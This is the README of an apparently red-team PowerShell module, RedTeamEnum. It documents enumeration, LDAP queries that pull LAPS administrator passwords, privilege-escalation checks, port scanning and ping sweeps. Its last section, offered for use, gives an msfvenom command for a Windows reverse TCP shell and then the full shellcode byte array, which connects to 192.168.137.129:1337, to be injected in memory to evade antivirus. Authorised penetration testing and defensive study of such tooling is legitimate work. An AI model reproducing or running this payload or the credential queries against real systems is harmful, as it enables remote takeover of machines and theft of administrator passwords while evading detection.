# PowerShell-Red-Team-Enum
Collection of PowerShell functions a Red Teamer may use to collect data from a machine or gain access to a target. I added ps1 files for the commands that are included in the RedTeamEnum module. This will allow you to easily find and use only one command if that is all you want. If you want the entire module perform the following actions after downloading the RedTeamEnum directory and contents to your device.
```powershell
C:\PS> robocopy .\RedTeamEnum $env:USERPROFILE\Documents\WindowsPowerShell\Modules\RedTeamEnum *
# This will copy the module to a location that allows you to easily import it. If you are using OneDrive sync you may need to use $env:USERPROFILE\OneDrive\Documents\WindowsPowerShell\Modules\RedTeamEnum instead.

C:\PS> Import-Module -Name RedTeamEnum -Verbose
# This will import all the commands in the module. 

C:\PS> Get-Command -Module RedTeamEnum
# This will list all the commands in the module.
```

- Convert-Base64.psm1 is a function as the name states for encoding and/or decoding text into Base64 format.
```powershell
C:\PS> Convert-Base64 -Value "Convert me to base64!" -Encode

C:\PS> Convert-Base64 -Value "Q29udmVydCBtZSB0byBiYXNlNjQh" -Decode
```

- Get-LdapInfo.psm1 is a function I am very proud of for performing general LDAP queries. Although only two properties will show in the output, all of the properties associated with object can be seen by piping to Select-Object -Property *.
```powershell
 C:\PS> Get-LdapInfo -DomainControllers | Select-Object -Property 'Name','ms-Mcs-AdmPwd'
```

- Test-PrivEsc.ps1 is a function that can be used for finding whether WSUS updates over HTTP are vulnerable to PrivEsc, Clear Text credentials are stored in common places,  AlwaysInstallElevated is vulnerable to PrivEsc, Unquoted Service Paths exist, and enum of possible weak write permissions for services.
```powershell
 C:\PS> Test-PrivEsc
```

- Get-InitialEnum.ps1 is a function for enumerating the basics of a Windows Operating System to help better display possible weaknesses.
```powershell
 C:\PS> Get-InitialEnum
```

- Start-SimpleHTTPServer is a function used to host an HTTP server for downloading files. It is meant to be similart to pythons SimpleHTTPServer module. Directories are not traversable through the web server. The files that will be hosted for download will be from the current directory you are in when issuing this command.
```powershell
C:\PS> Start-SimpleHTTPServer
Open HTTP Server on port 8000

#OR
C:\PS> Start-SimpleHTTPServer -Port 80
# Open HTTP Server on port 80
```

- Invoke-PortScan.ps1 is a function for scanning all possible TCP ports on a target. I will improve in future by including UDP as well as the ability to define a port range.
```powershell
 C:\PS> Invoke-PortScan -IpAddress 192.168.0.1
```

- Invoke-PingSweep is a function used for performing a ping sweep of a subnet range. 
```powershell
Invoke-PingSweep -Subnet 192.168.1.0 -Start 192 -End 224 -Source Singular
# NOTE: The source parameter only works if IP Source Routing value is "Yes"

Invoke-PingSweep -Subnet 10.0.0.0 -Start 1 -End 20 -Count 2
# Default value for count is 1

Invoke-PingSweep -Subnet 172.16.0.0 -Start 64 -End 128 -Count 3 -Source Multiple
```

Invoke-InMemoryPayload is used for AV Evasion using an In-Memory injection. This will require the runner to generate an msfvenom payload using a command similar to the example below, and entering the "[Byte[]] $buf" variable into Invoke-InMemoryPayloads "ShellCode" parameter.
```bash
# Generate payload to use
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.137.129 LPORT=1337 -f powershell
```
Start a listener, use that value in the "ShellCode" parameter, and run the command to gain your shell. This will also require certain memory protections to not be enabled. 
__NOTE:__ Take note there are __NOT ANY DOUBLE QUOTES__ around the ShellCode variables value. This is because it is expecting a byte array.
```powershell
Invoke-InMemoryPayload -Payload 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x5,0x39,0xc0,0xa8,0x89,0x81,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x2,0x0,0x0,0x49,0xb8,0x63,0x6d,0x64,0x0,0x0,0x0,0x0,0x0,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0xd,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x1,0x1,0x48,0x8d,0x44,0x24,0x18,0xc6,0x0,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0xe,0x41,0xba,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5 -Verbose
